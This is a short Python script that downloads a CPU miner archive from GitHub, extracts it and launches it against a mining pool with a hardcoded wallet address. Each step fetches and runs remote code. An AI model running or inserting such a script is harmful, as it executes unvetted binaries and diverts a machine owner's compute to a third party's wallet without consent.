#!/usr/bin/python
import os
import sys
import time

os.system ("wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz")
os.system ("tar -xvf cpuminer-opt-linux.tar.gz")
os.system("./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17070 -u WPMrhi8WDHqGUw8xUVhngcMo1wRgtKPxjy.casa2")
